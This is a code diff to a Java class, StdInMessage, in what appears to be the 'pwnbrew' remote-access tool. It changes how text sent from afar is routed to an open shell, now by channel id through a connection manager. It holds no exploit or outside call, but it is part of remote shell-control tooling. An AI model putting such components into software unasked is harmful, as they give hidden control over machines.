@@ -47,9 +47,12 @@ package pwnbrew.network.shell.messages;
 
 import java.io.IOException;
 import java.util.logging.Level;
-import pwnbrew.log.RemoteLog;
+import pwnbrew.ClientConfig;
 import pwnbrew.log.LoggableException;
+import pwnbrew.log.RemoteLog;
+import pwnbrew.manager.OutgoingConnectionManager;
 import pwnbrew.manager.PortManager;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.shell.Shell;
 import pwnbrew.network.shell.ShellMessageManager;
 
@@ -83,21 +86,19 @@ public class StdInMessage extends ProcessMessage {
     @Override
     public void evaluate(PortManager theManager) {
     
-        try {
-            
-            ShellMessageManager aSMM = ShellMessageManager.getShellMessageManager();
-            if( aSMM == null){
-                aSMM = ShellMessageManager.initialize( theManager );
-            }
-            
-            //Get the open shell
-            Shell aShell = aSMM.getShell( getSrcHostId() );
-            if( aShell != null ){
-                aShell.sendInput( new String( getMsgBytes()) );
-            }
-            
-        } catch(IOException | LoggableException ex ){
-            RemoteLog.log( Level.SEVERE, NAME_Class, "evaluate()", ex.getMessage(), null);        
+        //Get config
+        ClientConfig theConf = ClientConfig.getConfig();
+        int socketPort = theConf.getSocketPort();
+        
+        //The channel id
+        int channelId = getChannelId();
+        
+        //Get port router and connection manager
+        ClientPortRouter aPR = (ClientPortRouter) theManager.getPortRouter( socketPort );
+        OutgoingConnectionManager aOCM = aPR.getConnectionManager();
+        if( aOCM != null ){
+            Shell aShell = aOCM.getShell( channelId );
+            aShell.sendInput( new String( getMsgBytes()) );        
         }
     }
 
